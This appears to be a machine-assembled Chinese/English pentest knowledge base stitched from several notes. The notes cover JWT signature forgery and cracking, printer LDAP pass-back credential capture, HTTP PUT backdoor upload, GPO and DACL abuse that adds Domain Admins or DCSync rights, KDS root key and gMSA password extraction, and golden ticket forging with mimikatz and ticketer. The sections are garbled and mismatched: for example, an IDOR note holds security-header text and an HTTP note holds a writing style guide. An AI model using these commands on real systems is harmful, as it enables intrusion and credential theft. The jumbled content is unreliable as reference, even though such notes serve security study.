content: 来源路径： 02-知识点/域与Windows/Insecure JSON Web Tokens 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Insecure JSON Web Tokens 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Insecure JSON Web Tokens 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Insecure JSON Web Tokens 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Insecure JSON Web Tokens、Theory、Practice、Sensitive data、Signature attack：None algorithm；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 8 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Insecure JSON Web Tokens Theory Practice Sensitive data Signature attack：None algorithm Signature attack：RS256 to HS256 Signature attack：KID header 路径穿越 Cracking the secret Recovering the public key # 核心要点 Some web applications rely on JSON Web Tokens (JWTs) for stateless 认证 and access control instead of stateful ones with traditional session cookies. Some implementations are insecure and allow attackers to 绕过 controls, impersonate users, or retrieve secrets. Testers need to find if, and where, the tokens are used. A JWT is a base64 string of at least 100 characters, made of three parts (header, 载荷，signature) separated by dot, and usually located in 授权 headers with the Bearer keyword. See the the following example. Once the tokens are found, testers need to assess their implementation's security by attempting some known attacks and flaws. Testers need to decode the 令牌，change the algorithm to None (or none, NONE, nOnE) in the header, remove the signature, and send the modified 令牌. Some applications are vulnerable to this attack since some support a None algorithm for signature. If the 令牌 is accepted by the web app, it means the 载荷 can be altered. If the algorithm used to sign the 载荷 is RS256, testers can try to use HS256 instead. Instead of signing the JWT 载荷 with a private key, using HS256 will make the web app sign it with a public key that can sometimes be easily obtained. # 命令 / 载荷 / 操作片段 # 1. Practice 1Authorization: Bearer eyJ0eXAiOiJKV1Q[...].eyJpc3MiOiJodHRwO[...].HAveF7AqeKj-4[...] # 2. Signature attack：None algorithm 12345import jwtold_token = 'eyJ0eXAiOiJKV1Q[...].eyJpc3MiOiJodHRwO[...].HAveF7AqeKj-4[...]'old_token_payload = jwt.decode(old_token, verify=False)new_token = jwt.encode(old_token_payload, key='', algorithm=None)print(new_token) # 3. Signature attack：None algorithm 1234import jwtpayload = {'key1':'value1', 'key2':'value2'}token = jwt.encode(payload, key='', algorithm=None)print(token) # 4. Signature attack：RS256 to HS256 123456import jwtold_token = 'eyJ0eXAiOiJKV1Q[...].eyJpc3MiOiJodHRwO[...].HAveF7AqeKj-4[...]'old_token_payload = jwt.decode(old_token, verify=False)public_key = open('pubkey.pem', 'r').read()new_token = jwt.encode(old_token_payload, key=public_key, algorithm='HS256')print(new_token) # 5. Signature attack：RS256 to HS256 12345import jwtpublic_key = open('pubkey.pem', 'r').read()payload = {'key1':'value1', 'key2':'value2'}token = jwt.encode(payload, key=public_key, algorithm='HS256')print(token) # 6. Signature attack：KID header 路径穿越 123456import jwt, ospayload = {'key1':'value1', 'key2':'value2'}with open("path/to/file", 'r') as file: data = file.read()token = jwt.encode(payload, key=data, algorithm='HS256', headers={"kid": "../../../path/to/file"})print(token) # 7. Cracking the secret 1234567# crack the secret using dictionnary attackjwt_tool.py -v -C -d $wordlist_file "$JWT_value"# use the secret to tapmer (-T option) the token# running this command will show up a menu to choose the value to tamper# the result token will be signed with the submited secret using the specified singing algorithm "alg" (hs256/hs384/hs512 = HMAC-SHA signing).jwt_tool.py -v -S $alg -p "$secret" -T "$JWT_value" # 8. Cracking the secret 1hashcat --hash-type 16500 --attack-mode 0 $JWTs_file $wordlist_file # 工具与参考入口 kid JWT 认证 绕过 via kid header 路径穿越 Intigriti JWT.io JWT tool JWT-Key-Recover https://www.sjoerdlangkemper.nl/2016/09/28/attacking-JWT - 认证 / https://auth0.com/blog/critical-vulnerabilities-in-json-web - 令牌 - libraries/ https://blog.imaginea.com/stateless - 认证 - using-JWT-2/ https://portswigger.net/web-security/JWT https://systemweakness.com/deep-dive-into-JWT-attacks-efc607858af6 # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Some implementations are insecure and allow attackers to 绕过 controls, impersonate users, or retrieve secrets. Changing 密码 and realizing the old session cookies is still valid and hasn't been revoked In some cases, cookies can be used for SQL queries or for dynamic content. Testers should make sure the cookies are not vulnerable to SQL injections or XSS. HTTPonly: cookies can't be retrieved by client-side scripts like JavaScript, hence protecting them from XSS (跨站脚本 XSS) cookie-stealing attacks Secure: cookies can only be sent through HTTPS sessions, hence mitigating MITM (Man In The Middle) attacks allowing attackers to eavesdrop on unencrypted communications and stealing cookies SameSite: cookies can only be sent with requests initiated from the same registrable domain, hence mitigating the risk of CSRF (跨站请求伪造 CSRF) and Information leakage attacks. # 工具与参考入口 source https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies https://medium.com/@muratkaraoz/web-app-pentest-cheat-sheet-c17394af773 https://web.dev/samesite-cookies-explained/ # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Also, several printers will contain logs with usernames or could even be able to 下载 all usernames from the Domain Controller. All this sensitive information and the common lack of security makes printers very interesting for attackers. https://www.ceos3c.com/hacking/obtaining-domain - 凭据 - printer-netcat/ https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856 Location: The LDAP server list is usually found in the web interface (e.g. Network ➜ LDAP Setting ➜ Setting Up LDAP). Behavior: Many embedded web servers allow LDAP server modifications without re-entering 凭据 (usability feature → security risk). 利用: Redirect the LDAP server address to an attacker-controlled host and use the Test Connection / Address Book Sync button to force the printer to bind to you. CVE-2024-12510 – LDAP pass-back: change the LDAP server address and trigger a lookup, causing the device to leak the configured Windows 凭据 to the attacker-controlled host. CVE-2024-12511 – SMB/FTP pass-back: identical issue via scan-to-folder destinations, leaking NetNTLMv2 or FTP clear-text creds. # 命令 / 载荷 / 操作片段 # 1. Method 1 – Netcat Listener 1sudo nc -k -v -l -p 389 # LDAPS → 636 (or 3269) # 2. Method 2 – Full Rogue LDAP server (recommended) 123456# Debian/Ubuntu examplesudo apt install slapd ldap-utilssudo dpkg-reconfigure slapd # set any base-DN – it will not be validated# run slapd in foreground / debug 2slapd -d 2 -h "ldap:///" # only LDAP, no LDAPS # 3. Xerox VersaLink – CVE-2024-12510 & CVE-2024-12511 1sudo nc -k -v -l -p 389 # capture LDAP bind # 工具与参考入口 https://www.ceos3c.com/hacking/obtaining-domain - 凭据 - printer-netcat/ https://grimhacker.com/2018/03/09/just-a-printer/ # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Active Directory 攻击链 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/IDOR (Insecure Direct Object Reference) 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # IDOR (Insecure Direct Object Reference) 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 IDOR (Insecure Direct Object Reference) 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 IDOR (Insecure Direct Object Reference) 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：IDOR (Insecure Direct Object Reference)、Theory、Practice、IDOR to self-XSS、Identifying Potential IDORs；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 8 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 IDOR (Insecure Direct Object Reference) Theory Practice IDOR to self-XSS Identifying Potential IDORs Quick manual tampering (Burp Repeater) Automated 枚举 (Burp Intruder /curl loop) Enumerating predictable 下载 IDs (ffuf) Authenticated combinatorial 枚举 (ffuf + jq) Error-response oracle for user/file 枚举 Real-World Case Study – McHire Chatbot Platform (2025) Case Study – Wristband QR codes as weak bearer tokens (2025–2026) Impact of IDOR / BOLA Mitigations & Best Practices Tooling # 核心要点 When web applications badly implement access objects directly (files, database objetcs) with user-supplied inputs, they can be vulnerable to Insecure Direct Object Reference (IDOR) allowing attackers to access unauthorized resources. In order to test IDOR vulnerabilities, testers can follow two methodologies that depend on the context: Successful 利用 normally allows horizontal or vertical privilege-escalation such as reading or modifying other users’ data and, in the worst case, full account takeover or mass-data exfiltration. Prefer endpoints that read or update data (GET, PUT, PATCH, DELETE). Use an authenticated low-privilege session and change only the ID keeping the same 令牌 /cookie. The absence of an 授权 error is usually a sign of IDOR. Some IDORs accept multiple object IDs (e.g., chat threads between two users). These headers are important in preventing 利用 of vulnerabilities such as XSS, Man-in-the-Middle, clickjacking, etc. Lets a web site tell browsers that it should only be accessed using HTTPS, instead of using HTTP. Prevents Man-in-the-Middle attacks. Header now obsolete (use the Content-Security-Policy with the frame-ancestors directive set to none instead). This header indicated whether or not a browser should be allowed to render a page in a <frame>, <iframe>, <embed> or <object>. Prevents clickjacking attacks. XCTO is used by the server to indicate that the MIME types advertised in the Content-Type headers should be followed and not be changed. It prevents MIME type sniffing attacks. Read the cross-origin resource sharing article for more insight Header now deprecated, only old browsers may use it. More harm can be done using X-XSS-Protection. Other methods can be used to prevent XSS attacks (CSP, escaping, sanitization...). # 命令 / 载荷 / 操作片段 # 1. Practice 1securityheaders "www.target.url" # 2. Practice 1curl --head $URL # 工具与参考入口 clickjacking Strict-Transport-Security https://hstspreload.org/ X-Frame-Options obsolete <frame> <iframe> <embed> <object> X-Content-Type-Options MIME types Content-Type JavaScript MIME type Cross-Origin-Resource-Sharing origins Content-Security-Policy fallback X-XSS-Protection securityheaders this online scanner # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 XSS 跨站脚本 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/HTTP methods 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # HTTP methods 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 HTTP methods 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 HTTP methods 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：HTTP methods、Theory、Verb tampering、Methods abuse、Practice；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 HTTP methods Theory Verb tampering Methods abuse Practice 侦察 Abusing the PUT method Apache Tomcat JSP PUT：CVE-2017-12615 # 核心要点 Some websites filter access to resources but fail at filtering out all HTTP methods. When an attacker tries to access a resource with different methods (GET, POST, HEAD, etc.) to 绕过 the access control, this is called HTTP verb tampering. Some HTTP methods can be used for malicious purposes: PUT, DELETE, etc. The HTTP methods abuse is not aimed at gaining access to a specific page like verb tampering but more like what methods are accepted by the server and how can an attacker profit from those. A manual HTTP request with the OPTIONS method can also be used to enumerate what methods are supported. This works if the OPTIONS methods is allowed in the first place. The PUT method can be used to 上传 arbitrary files. Some directories have different rights, it can be useful to test the method on a wide range of directories. 利用 of this 漏洞 can be achieved manually by creating a .jsp file and by uploading it to the target server. If the 上传 is successful, the following JSP webshell (source) can then be uploaded to attempt at execute arbitrary commands on the remote server. # 命令 / 载荷 / 操作片段 # 1. 侦察 12httpmethods -u "https://target.url/"httpmethods -u "https://target.url/restricted_page" # 2. 侦察 1curl --include --request OPTIONS "https://target.url/" # 3. Abusing the PUT method 1curl --include --upload-file "backdoor.php" "https://target.url/" # 4. Apache Tomcat JSP PUT：CVE-2017-12615 1<% out.write("<html><body><h3>JSP upload successfully</h3></body></html>"); %> # 5. This can cause either the front-end or the back-end server to incorrectly interpret the request, passing through a malicious HTTP query. Performing a HTTP 请求走私 attack can lead to : Hijack sessions of web users, as well as 凭据 Conduct 跨站脚本 XSS (XSS) attacks without requiring any action from the user In TE.CL RS (HTTP 请求走私) the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. We can craft the follow HTTP request to 利用 : If HTTP/2 is used, can the session be downgraded it to perform H2.CL or H2.TE ? http2smugl (Python) can be used to detect this, with the http2smugl detect $URL command An "attack" request that is designed to interfere with the processing of the next request. reads up to the beginning of the line following the second request determines that the request is 4 bytes long (meaning it stops reading at the start of the line following 7c). scan for possible HTTP HTTP 请求走私 Use the turbo intruder -> right click on the request -> Extensions -> HTTP Request Smuggler -> Smuggle Attack (CL.TE or TE.CL, depending on what the manual operations or Smuggle Prob identified) # 命令 / 载荷 / 操作片段 # 1. Instructional and Informative: The writing aims to educate the reader, with clear instructions and explanations. It avoids being overly casual, focusing instead on delivering detailed, technical knowledge. "This attack is super easy to pull off!" → "This attack is straightforward to execute." "Here’s a cool trick you can use to 绕过 the firewall" → "A technique to 绕过 the firewall involves…" "You can conduct the attack with tool XYZ" → "The attack can be conducted with tool XYZ" Alert the reader to potential dangers. Navigation panel 12345{ "text": 'Category', "link": '/.../index.md' "items": [// ... # 4. Code 1print('hello world') # 5. Tabs 1234567== tab aSome content== tab bb content # 6. Callouts 12345678910111213141516> [!NOTE] NOTE> Note from the author, not critical to the main content. To clarify, offer references, add content or background.> [!TIP] TIP> Offer helpful advice or best practices. Providing shortcuts or expert recommandations.> [!WARNING] WARNING> Alert the reader to potential dangers. Provide OPSEC advice.> [!CAUTION] CAUTION> When there's critical information the reader needs to be aware of.> [!SUCCESS] SUCCESS> When the author wants to highlight a successful outcome or scenario.Details blocks can also be used # 7. Images and links 1Some caption{.caption} # 8. Images and links 1> [!YOUTUBE] https://www.youtube.com/watch?v=example # 9. Quotes 123> "Someone said something important and it should be highlighted in the article? Please quote it and attribute it to the initial author.">> _(Author, date, source)_ # 10. Highlighting contributors 123---authors: author1, author2, ...--- # 11. Category attribute 123---category: ad--- # 工具与参考入口 VitePress docs syntax highlighting line highlighting line focus colored diffs errors and warnings highlighting line numbers code groups Links Tables Emojis frontmatter # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 SSTI 服务端模板注入 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Some ACEs can give that control (see this BlackHat talk, page 28): WriteProperty to the GPC-File-Sys-Path property of a GPO (specific GUID specified) GenericAll, GenericWrite, WriteProperty to any property (no GUID specified) WriteDacl, WriteOwner GPO-based attacks can be conducted with New-GPOImmediateTask (PowerView module), SharpGPOAbuse (C#), or pyGPOabuse (python) and GPOwned (Python) for UNIX-like systems. An attacker can edit the GPO to add a scheduled task that runs instantly and removes itself after, every time Group Policy refreshes. The attacker can then gain access to all AD objects this GPO applies to. # 命令 / 载荷 / 操作片段 # 1. Immediate Scheduled Task 12345# GPOwned (buggy, not to use in production) - execute something (e.g. calc.exe)GPOwned -u 'user' -p 'password' -d 'domain' -dc-ip 'domaincontroller' -gpoimmtask -name '{12345677-ABCD-9876-ABCD-123456789012}' -author 'DOMAIN\Administrator' -taskname 'Some name' -taskdescription 'Some description' -dstpath 'c:\windows\system32\calc.exe'# pyGPOabuse, update an existing GPO - add a local adminpygpoabuse 'domain'/'user':'password' -gpo-id "12345677-ABCD-9876-ABCD-123456789012" # 2. Immediate Scheduled Task 1New-GPOImmediateTask -Verbose -Force -TaskName 'TaskName' -GPODisplayName 'GPODisplayName' -Command cmd -CommandArguments "/c net localgroup administrators shutdown /add" # 3. Immediate Scheduled Task 1New-GPOImmediateTask -Force -Remove -GPODisplayName 'GPODisplayName' # 4. MultiTasking Attack 1Invoke-GPOwned -GPOName "Target_GPO_Name" -LoadDLL ".\Microsoft.ActiveDirectory.Management.dll" -User "Attacker" -DA -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -SecondTaskXMLPath ".\wsadd.xml" -Author "DA_User" -SecondXMLCMD "/r net group 'Domain Admins' <Attacker> /add /domain" # 工具与参考入口 adsecurity.org this BlackHat talk New-GPOImmediateTask PowerView SharpGPOAbuse pyGPOabuse GPOwned Invoke-GPOwned https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/ https://beta.hackndo.com/gpo-abuse-with-edit-settings/ # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

The attacker can write a new ACE to the target object’s DACL (Discretionary Access Control List). This can give the attacker full control of the target object. Story time, Exchange Servers used to have WriteDacl over domain objects, allowing attackers to conduct a PrivExchange attack where control would be gained over an Exchange Server which would then be used to grant an attacker-controlled object DCSync privileges to the domain. In April 2024, Synacktiv explained that if GenericAll, GenericWrite or Manage Group Policy Links privileges are available against an Organisational Unit (OU), then it's possible to compromise its child users and computers with adminCount=1 through "gPLink spoofing". For a DCSync granting attack, instead of using dacledit, ntlmrelayx has the ability to operate that abuse with the --escalate-user option (see this). Alternatively, the Invoke-PassTheCert fork can be used, authenticating through Schannel via PassTheCert (PowerShell version). # 命令 / 载荷 / 操作片段 # 1. Grant rights 12345# Give full controldacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target 'target_object' "$DOMAIN"/"$USER":"$PASSWORD"# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)dacledit.py -action 'write' -rights 'DCSync' -principal 'controlled_object' -target 'target_object' "$DOMAIN"/"$USER":"$PASSWORD" # 2. Grant rights 12# Give full control on the Users container with inheritance to the child objectdacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target-dn 'CN=Users,DC=domain,DC=local' -inheritance "$DOMAIN"/"$USER":"$PASSWORD" # 3. Grant rights 12345# Give full control (with inheritance to the child object if applicable)bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll "$TargetObject" "$ControlledPrincipal"# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add dcsync "$ControlledPrincipal" # 4. Grant rights 12345# Give full controlAdd-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object" # 5. STRIFE' against 'ESARVI01$'Invoke-PassTheCert -Action 'CreateInboundACE' -LdapConnection $LdapConnection -Identity 'CN=Zack ZS. STRIFE,CN=Users,DC=X' -Target 'CN=ESARVI01,CN=Computers,DC=X' -AceQualifier 'AccessAllowed' -AccessMaskNames 'GenericAll'# Grant DCSync (method 1) to 'Wanha BE. OWNED,CN=Users,DC=X'# Get the owner of user 'John JD. DOE'Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $LdapConnection -Enum 'Owner' -Object 'CN=John JD. Practice Obtaining 持久化 Retrieving gMSA passwords Account information dump 密码 calculation # 核心要点 The 密码 of a gMSA account can legitimately be requested by authorized applications. In that case, an LDAP request is made to the domain controller, asking for the gMSA account's msDS-ManagedPassword attribute's value. Once an AD environment is compromised, acquiring the "GoldenGMSA" 持久化 requires to dump the KDS root keys. The KDS (Key Distribution Service) root keys can be exfiltrated from the domain with high-privileged access with GoldenGMSA (C#). Without the --forest argument, the forest root domain is queried, hence requiring Enterprise Admins or Domain Admins privileges in the forest root domain, or SYSTEM privileges on a forest root Domain Controller. With the --forest argument specifying the target domain or forest, SYSTEM privileges are required on the corresponding domain or forest Domain Controller. In case a child domain is specified, the parent domain keys will be dumped as well. pyGoldenGMSA (Python) implements the cryptographic pipeline in Python, enabling KDS root key extraction and gMSA 密码 computation from Linux-based platforms without Windows-specific dependencies. 密码 ID: which rotates regularly Online computation (automatically retrieves KDS root key and 密码 ID from the DC): Offline computation (no network access required, using previously dumped KDS root key and 密码 ID): # 命令 / 载荷 / 操作片段 # 1. Obtaining 持久化 1GoldenGMSA.exe kdsinfo # 2. Obtaining 持久化 1GoldenGMSA.exe kdsinfo --forest child.lab.local # 3. Obtaining 持久化 12345678# Password authenticationpython3 main.py -u "$USER@$DOMAIN" -p "$PASSWORD" -d $DOMAIN --dc-ip $DC_IP kdsinfo# Pass-the-Hash authenticationpython3 main.py -u "$USER" -d $DOMAIN --dc-ip $DC_IP --nt-hash $NT_HASH kdsinfo# Pass-the-Ticket (Kerberos) authenticationpython3 main.py -u "$USER" -d $DOMAIN --dc-ip $DC_IP --ccache admin.ccache kdsinfo # 4. Account information dump 1GoldenGMSA.exe gmsainfo # 5. Account information dump 1GoldenGMSA.exe gmsainfo --sid "S-1-5-21-[...]1586295871-1112" # 6. Account information dump 12345# Enumerate all gMSA accountspython3 main.py -u "$USER@$DOMAIN" -p "$PASSWORD" -d $DOMAIN --dc-ip $DC_IP gmsainfo# Enumerate a specific gMSA by SIDpython3 main.py -u "$USER@$DOMAIN" -p "$PASSWORD" -d $DOMAIN --dc-ip $DC_IP gmsainfo --sid "$GMSA_SID" # 7. 密码 calculation 1GoldenGMSA.exe compute --sid "S-1-5-21-[...]1586295871-1112" --kdskey "AQA[...]jG2/M=" --pwdid "AQAAAEtEU[...]gBsAGEAYgBzAAAA" # 8. 密码 calculation 123456import base64import hashlibb64 = input("Password Base64: ")print("NT hash:", hashlib.new("md4", base64.b64decode()).hexdigest()) # 9. 密码 calculation 1python3 main.py -u "$USER@$DOMAIN" -p "$PASSWORD" -d $DOMAIN --dc-ip $DC_IP compute --sid $GMSA_SID # 10. 密码 calculation 1python3 main.py compute --sid $GMSA_SID --kdskey "AQAAAOlMCM5U37Qv...<base64>..." --pwdid "AQAAAEtEU0sC...<base64>..." # 11. 密码 calculation 12NT hash: 1c368c74ef1bcbd4892c95a8d6de0f30LM:NT format: aad3b435b51404eeaad3b435b51404ee:1c368c74ef1bcbd4892c95a8d6de0f30 # 工具与参考入口 constructed attribute GoldenGMSA pyGoldenGMSA https://www.semperis.com/blog/golden-gmsa-attack https://www.trustedsec.com/blog/splunk-spl-queries-for-detecting-gmsa-attacks/ # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Using this encryption algorithm (instead of giving the NThash) will be stealthier. There are Impacket scripts for each step of a 黄金票据 creation : retrieving the krbtgt, retrieving the domain SID, creating the 黄金票据. On Windows, mimikatz (C) can be used with kerberos::golden for this attack. For both mimikatz and Rubeus, the /ptt flag is used to automatically inject the ticket. # 命令 / 载荷 / 操作片段 # 1. Practice 1234567891011# Find the domain SIDlookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0# Create the golden ticket (with an RC4 key, i.e. NT hash)ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" "randomuser"# Create the golden ticket (with an AES 128/256bits key)ticketer.py -aesKey "$krbtgtAESkey" -domain-sid "$domainSID" -domain "$DOMAIN" "randomuser"# Create the golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups idsticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -user-id "$USERID" -groups "$GROUPID1,$GROUPID2,..." "randomuser" # 2. Practice 12345678# with an NT hashkerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt# with an AES 128 keykerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt# with an AES 256 keykerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:randomuser /ptt # 工具与参考入口 Impacket mimikatz kerberos::golden ticketer mimikatz GoldenCopy https://en.hackndo.com/kerberos-silver-golden-tickets/ https://adsecurity.org/?p=483 # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Kerberos 票据攻击 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: Golden gMSA-dMSA Attack (Offline Derivation of Managed Service Account Passwords) 技术笔记
content: 来源路径： 02-知识点/域与Windows/Golden gMSA-dMSA Attack (Offline Derivation of Managed Service Account Passwords) 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Golden gMSA-dMSA Attack (Offline Derivation of Managed Service Account Passwords) 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Golden gMSA-dMSA Attack (Offline Derivation of Managed Service Account Passwords) 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Golden gMSA-dMSA Attack (Offline Derivation of Managed Service Account Passwords) 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Golden gMSA/dMSA Attack (Offline Derivation of Managed Service Account Passwords)、Overview、Golden gMSA / Golden dMSA Attack、Prerequisites、Golden gMSA /dMSA；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Golden gMSA/dMSA Attack (Offline Derivation of Managed Service Account Passwords) Overview Golden gMSA / Golden dMSA Attack Prerequisites Golden gMSA / dMSA Phase 1 – Extract the KDS Root Key 检测 & Mitigation Tooling # 核心要点 Windows Managed Service Accounts (MSA) are special principals designed to run services without the need to manually manage their passwords. For both variants the 密码 is not stored on each Domain Controller (DC) like a regular NT - 哈希. Instead every DC can derive the current 密码 on-the-fly from: A per-account ManagedPasswordID (GUID) found in the msDS-ManagedPasswordId attribute. The derivation is: AES256 HMAC( KDSRootKey , SID || ManagedPasswordID ) → 240 byte blob finally base64-encoded and stored in the msDS-ManagedPassword attribute. No Kerberos traffic or domain interaction is required during normal 密码 usage – a member host derives the 密码 locally as long as it knows the three inputs. If an attacker can obtain all three inputs offline they can compute valid current and future passwords for any gMSA/dMSA in the forest without touching the DC again, bypassing: LDAP read auditing 密码 change intervals (they can pre-compute) Restrict DC backup and registry hive read capabilities to Tier-0 administrators. Audit reads / changes to CN=Master Root Keys,… and userAccountControl flags of service accounts. Detect unusual base64 密码 writes or sudden service 密码 reuse across hosts. Consider converting high-privilege gMSAs to classic service accounts with regular random rotations where Tier-0 isolation is not possible. mimikatz – lsadump::secrets, sekurlsa::pth, kerberos::ptt. Rubeus – pass-the-ticket using derived AES keys. # 命令 / 载荷 / 操作片段 # 1. Phase 1 – Extract the KDS Root Key 12345678910111213reg save HKLM\SECURITY security.hivereg save HKLM\SYSTEM system.hive# With mimikatz on the DC / offlinemimikatz # lsadump::secretsmimikatz # lsadump::trust /patch # shows KDS root keys too# With GoldendMSAGoldendMSA.exe kds --domain <domain name> # query KDS root keys from a DC in the forestGoldendMSA.exe kds# With GoldenGMSAGoldenGMSA.exe kdsinfo # 2. Phase 1 – Extract the KDS Root Key 12345# Authenticated or anonymous depending on ACLsGet-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \ Select sAMAccountName,objectSid,msDS-ManagedPasswordIdGoldenGMSA.exe gmsainfo # 3. Phase 1 – Extract the KDS Root Key 12345# LDAP enumeration (kerberos / simple bind)GoldendMSA.exe info -d example.local -m ldap# RID brute force if anonymous binds are blockedGoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd # 4. Phase 1 – Extract the KDS Root Key 